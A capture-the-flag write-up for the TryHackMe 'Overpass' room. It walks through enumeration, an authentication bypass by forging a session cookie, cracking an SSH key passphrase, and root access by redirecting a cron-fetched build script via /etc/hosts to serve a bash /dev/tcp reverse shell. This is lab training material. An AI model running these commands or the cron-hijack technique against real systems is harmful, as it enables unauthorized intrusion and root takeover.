# Overpass Writeup

![bannner](/thm/images/overpass/banner.png)

Writeup for room - [Overpass](https://tryhackme.com/room/overpass)

## Scanning and Enumeration

Let's start with an nmap scan.

```
nmap <IP> -sV -sC -T4 -p-
```

![nmap scan](/thm/images/overpass/nmap.png)

We find 2 open ports, let's check port 80.

![homepage](/thm/images/overpass/homepage.png)

After looking through the pages and source code we really can't find anything that interesting. Let's check for hidden directories with gobuster.

![gobuster](/thm/images/overpass/gobuster.png)

Seems like there's an admin page.

![admin](/thm/images/overpass/admin.png)

We can't seem to get in with default credentials so we could try a bruteforce with hydra but the hints say we have to look at OWASP top 10.
When inspecting the source code we find a login.js so let's check that out.

![login](/thm/images/overpass/loginjs.png)

This functions is interesting because it tells us there's a cookie being used called "SessionToken".

![loginfunc](/thm/images/overpass/loginfunc.png)

Perhaps we can give this cookie a random value and it will let us in?

![cookie](/thm/images/overpass/sessioncookie.png)

Reload the page and we find a private ssh key for user james.

![sshkey](/thm/images/overpass/sshkey.png)

When we try to login with this private key we're asked for a passphrase so lets use john to crack it.
First we convert with ssh2john.py and then we crack it with the rockyou wordlist.

![john](/thm/images/overpass/john.png)

We cracked the passphrase, now we try again.
Don't forget to change the file permissions to 600 or ssh will complain.

![ssh](/thm/images/overpass/ssh.png)

## Privilege escalation

We're in! The user flag is the usual location and should be easy to find. Let's to try escalate our privilege.

sudo -l does not give us anything.
Perhaps there's an interesting file with SUID permission?

![suid](/thm/images/overpass/suid.png)

Again nothing we can use.

Let's check if we can exploit a cronjob.

![cronjob](/thm/images/overpass/cronjobs.png)

We can see there's a buildscript.sh run from overpass.thm/downloads/src. If we can edit /etc/hosts we can set overpass.thm to our own IP and get root privilege with a reverse shell.

First we edit /etc/hosts and put our own IP in.

![etchosts](/thm/images/overpass/etchosts.png)

Then we go back our own machine and create the exact same folders: downloads/src

```
mkdir -p downloads/src
```
Create a buildscript.sh in the src folder and paste the reverse shell in there.

```
bash -i >& /dev/tcp/<your_ip>/4444 0>&1
```

We start the http server.

```
sudo python -m SimpleHTTPServer 80
```
![http](/thm/images/overpass/httpserver.png)

At the same time we listen on port 4444 for a connection from the reverse shell.

```
nc -lnvp 4444
```
![nc](/thm/images/overpass/nc.png)

Hope this writeup helped you!
